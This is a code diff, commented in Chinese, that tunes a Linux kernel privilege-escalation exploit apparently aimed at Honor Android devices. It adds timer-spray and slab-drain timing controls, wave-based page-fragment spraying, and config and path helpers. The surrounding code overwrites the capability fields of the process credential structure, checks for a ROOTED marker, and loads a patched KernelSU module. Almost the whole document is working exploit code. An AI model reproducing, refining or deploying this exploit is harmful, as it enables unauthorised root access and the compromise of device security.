@@ -97,6 +97,82 @@ static void pin_cpu(int c)
     sched_setaffinity(0, sizeof s, &s);
 }
 
+/* ------------------------------------------------------------------ *
+ * 提速开关（环境变量，默认值即“提速”档），与 t64560_v36 保持一致：
+ *   T64560_PCP=1      deleter 与 spray 同核，靠 pcp 原地回收，不等排空。
+ *   T64560_FLOOR_MS=  每轮最早开始喷洒的时间（默认 600ms）。
+ *   T64560_WAVE_MS=   分波喷洒间隔（默认 200ms，0 = 不分波）。
+ *   T64560_POLL_MS=   排空轮询间隔（默认 20ms）。
+ * ------------------------------------------------------------------ */
+static int g_pcp;
+
+static int read_posix_slab(int *active, int *total);
+
+/* 可选调参文件：一行一个 KEY=VALUE，只在环境变量没设时生效。 */
+static void load_cfg(const char *path)
+{
+    FILE *f = fopen(path, "re");
+    char line[160];
+
+    if (!f)
+        return;
+    while (fgets(line, sizeof line, f)) {
+        char *eq = strchr(line, '=');
+        if (!eq)
+            continue;
+        *eq = 0;
+        char *k = line;
+        char *v = eq + 1;
+        while (*k == ' ' || *k == '\t') k++;
+        char *ke = k + strlen(k);
+        while (ke > k && (ke[-1] == ' ' || ke[-1] == '\t')) *--ke = 0;
+        char *ve = v + strlen(v);
+        while (ve > v && (ve[-1] == '\n' || ve[-1] == '\r' || ve[-1] == ' ')) *--ve = 0;
+        if (*k && getenv(k) == NULL)
+            setenv(k, v, 1);
+    }
+    fclose(f);
+}
+
+
+static const char *honor_work_dir(void)
+{
+    const char *dir = getenv("HONOR_WORK");
+    return dir && *dir ? dir : "/data/local/tmp/honor";
+}
+
+static void honor_work_path(char *out, size_t size, const char *name)
+{
+    snprintf(out, size, "%s/%s", honor_work_dir(), name);
+}
+
+static int env_ms(const char *name, int fallback)
+{
+    const char *s = getenv(name);
+
+    if (!s || !*s)
+        return fallback;
+    int v = atoi(s);
+    return v < 0 ? fallback : v;
+}
+
+/* 等 posix_timers_cache 回到 want 水平。返回耗时（ms）；超时返回 -1。 */
+static long long settle_slab(int want_a, int want_t, int max_ms)
+{
+    long long t0 = now_ms();
+    int act, tot;
+
+    for (;;) {
+        if (read_posix_slab(&act, &tot) == 0 &&
+            (want_a <= 0 || (act <= want_a + DRAIN_SLACK &&
+                             tot <= want_t + DRAIN_SLACK)))
+            return now_ms() - t0;
+        if (now_ms() - t0 >= max_ms)
+            return -1;
+        usleep(50000);
+    }
+}
+
 static int read_posix_slab(int *active, int *total)
 {
     FILE *f = fopen("/proc/slabinfo", "re");
@@ -198,7 +274,7 @@ static void *delete_worker(void *arg)
 {
     struct deljob *j = arg;
 
-    pin_cpu(2 + j->widx);
+    pin_cpu(g_pcp ? 0 : 2 + j->widx);
     while (!g_go_all[j->victim]) ;
     for (int i = j->widx; i < j->n; i += j->wcount)
         if (syscall(SYS_timer_delete, j->ids[i]) == 0)
@@ -449,7 +525,6 @@ int main(int argc, char **argv)
 
     if (nv > MAXVICTIM) nv = MAXVICTIM;
     if (nfrag > MAXFRAG) nfrag = MAXFRAG;
-    g_ring_cap = nfrag + 512;
 
     unsigned long long t_bset = cred + CRED_CAP_BSET;
     unsigned long long t_eff  = cred + CRED_CAP_EFFECTIVE;
@@ -468,6 +543,15 @@ int main(int argc, char **argv)
         rl.rlim_cur = rl.rlim_max;
         setrlimit(RLIMIT_NOFILE, &rl);
     }
+    /* 每个持有页的 socket 占一个 fd：把 nfrag 夹进 fd 上限。 */
+    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur > 128) {
+        long fd_cap = (long)rl.rlim_cur - 64;
+        if (nfrag > fd_cap)
+            nfrag = (int)fd_cap;
+        if (nfrag < 256)
+            nfrag = 256;
+    }
+    g_ring_cap = nfrag + 512;
 
     char *shm = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
     if (shm == MAP_FAILED) return 1;
@@ -478,7 +562,23 @@ int main(int argc, char **argv)
     if (!fbuf) return 1;
 
     int base_a = -1, base_t = -1;
-    read_posix_slab(&base_a, &base_t);
+    char cfg_path[512];
+    honor_work_path(cfg_path, sizeof(cfg_path), "speed.cfg");
+    load_cfg(cfg_path);
+    load_cfg("/data/local/tmp/speed.cfg");
+    int base_ok = read_posix_slab(&base_a, &base_t) == 0;
+
+    g_pcp = env_ms("T64560_PCP", 0) > 0;
+    int floor_ms = env_ms("T64560_FLOOR_MS", 600);
+    int wave_ms  = env_ms("T64560_WAVE_MS", 200);
+    int poll_ms  = env_ms("T64560_POLL_MS", 20);
+    if (poll_ms < 1) poll_ms = 1;
+    int batch = nfrag / 8;
+    if (batch < 200) batch = 200;
+    printf("v34 speed: floor=%dms wave=%dms batch=%d pcp=%d baseline=%d/%d slabinfo=%s\n",
+           floor_ms, wave_ms, batch, g_pcp, base_a, base_t,
+           base_ok ? "yes" : "no");
+    fflush(stdout);
 
     unsigned long long page = 0;     /* 阶段 1 泄漏到的 frag 页基址 */
     int keep_fd = -1;                /* 保活该页的 socket */
@@ -490,8 +590,9 @@ int main(int argc, char **argv)
         /* The APK's reference implementation passes 90/90. Honor has a lower
          * observed landing rate, so retain the caller's phase shape but give
          * each phase enough attempts to match the interactive workflow. */
-        if (attempts < 260)
-            attempts = 260;
+        int min_attempts = env_ms("T64560_MIN_ATTEMPTS", 260);
+        if (attempts < min_attempts)
+            attempts = min_attempts;
 
         if (phase == 1) build_fragment(fbuf, PAGE_FRAG_SZ, 0, t_bset, 0);
         else            build_fragment(fbuf, PAGE_FRAG_SZ, page, 0, t_eff);
@@ -509,6 +610,18 @@ int main(int argc, char **argv)
             pid_t vpid[MAXVICTIM];
             int *ids[MAXVICTIM];
             int total_all = 0;
+            long long at0 = now_ms();
+
+            /* 刷新本轮干净基线：上一轮残留必须先回到空闲水平。 */
+            long long settle_ms = base_ok ? settle_slab(base_a, base_t, drain_ms) : 0;
+            if (settle_ms >= 0) {
+                int na = -1, nt = -1;
+                if (read_posix_slab(&na, &nt) == 0) {
+                    base_a = na;
+                    base_t = nt;
+                }
+            }
+            int floor_eff = (!base_ok || settle_ms >= 0) ? floor_ms : min_drain;
 
             for (int i = 0; i < MAXVICTIM; i++) { vpid[i] = -1; ids[i] = NULL; }
             for (int j = 0; j < nv; j++) { g_go_all[j] = 0; g_del[j] = 0; }
@@ -547,28 +660,41 @@ int main(int argc, char **argv)
                 for (int i = 0; i < nworker; i++) pthread_join(th[i], NULL);
             }
 
+            /* 排空 + 分波喷洒：slabinfo 读不到时也能靠“后一批接住刚回到
+             * buddy 的计时器页”命中，不再白等满 drain_ms。 */
             long long t0 = now_ms();
             int drained = 0, act = -1, tot = -1, loose = 0;
-            while (now_ms() - t0 < drain_ms) {
-                if (read_posix_slab(&act, &tot) == 0) {
-                    int strict_ok = base_a > 0 && act <= base_a + DRAIN_SLACK &&
-                                    tot <= base_t + DRAIN_SLACK &&
-                                    now_ms() - t0 >= min_drain;
+            int waves = 0, got = 0, stall = 0;
+            int ring_before = g_ring_n;
+
+            for (;;) {
+                long long el = now_ms() - t0;
+                if (el >= drain_ms || got >= nfrag || stall >= 2) break;
+                if (base_ok && read_posix_slab(&act, &tot) == 0) {
+                    int strict_ok = act <= base_a + DRAIN_SLACK &&
+                                    tot <= base_t + DRAIN_SLACK && el >= floor_eff;
                     int loose_ok  = act > 0 && act < 1200 && tot < 1200;
                     if (strict_ok) { drained = 1; break; }
                     if (loose_ok) loose = 1;
-                    if (loose && now_ms() - t0 >= 8000) { drained = 2; break; }
+                    if (loose && el >= 8000) { drained = 2; break; }
                 }
-                usleep(100000);
+                if (wave_ms > 0 && el >= floor_eff + (long long)waves * wave_ms &&
+                    got + batch <= nfrag) {
+                    int added = frag_spray(batch, fbuf);
+                    if (added <= 0) stall++;
+                    else stall = 0;
+                    got += added;
+                    waves++;
+                }
+                usleep((useconds_t)poll_ms * 1000);
             }
             long long drained_ms = now_ms() - t0;
-
-            int ring_before = g_ring_n;
-            int got = drained ? frag_spray(nfrag, fbuf) : 0;
+            if (got < nfrag)
+                got += frag_spray(nfrag - got, fbuf);
 
             for (int j = 0; j < nv; j++)
                 if (vpid[j] > 0) kill(vpid[j], SIGKILL);
-            usleep(300000);
+            usleep(20000);
             for (int j = 0; j < nv; j++) free(ids[j]);
 
             /* 用 MSG_PEEK 回读，命中即保活那一页（不要消费掉） */
@@ -604,8 +730,10 @@ int main(int argc, char **argv)
 
             frag_trim_all();
 
-            printf("  p%d attempt=%d timers=%d drained=%d(%lldms) slab=%d/%d frag=%d leak=%d\n",
-                   phase, a, total_all, drained, drained_ms, act, tot, got, leaks);
+            printf("  p%d attempt=%d timers=%d settle=%lld drained=%d(%lldms) "
+                   "slab=%d/%d frag=%d waves=%d leak=%d elapsed=%lldms\n",
+                   phase, a, total_all, settle_ms, drained, drained_ms,
+                   act, tot, got, waves, leaks, now_ms() - at0);
             fflush(stdout);
         }
 
@@ -632,8 +760,9 @@ int main(int argc, char **argv)
     printf("check candidate: cat /data/local/tmp/ROOTED\n");
     fflush(stdout);
     if (!g_self) {
-        int marker = open("/data/local/tmp/honor/PHASE2_DONE",
-                          O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        char phase2_path[512];
+        honor_work_path(phase2_path, sizeof(phase2_path), "PHASE2_DONE");
+        int marker = open(phase2_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
         if (marker >= 0)
             close(marker);
         printf("PHASE2_DONE\n");
@@ -645,9 +774,11 @@ int main(int argc, char **argv)
         fflush(stdout);
         return candidate_main("PTGT");   /* 不返回 */
     }
-    printf("MODULE_LOAD pending path=/data/local/tmp/honor/ksu-patched.ko\n");
+    char module_path[512];
+    honor_work_path(module_path, sizeof(module_path), "ksu-patched.ko");
+    printf("MODULE_LOAD pending path=%s\n", module_path);
     fflush(stdout);
-    int module_fd = open("/data/local/tmp/honor/ksu-patched.ko", O_RDONLY);
+    int module_fd = open(module_path, O_RDONLY);
     errno = 0;
     long module_result =
         module_fd < 0
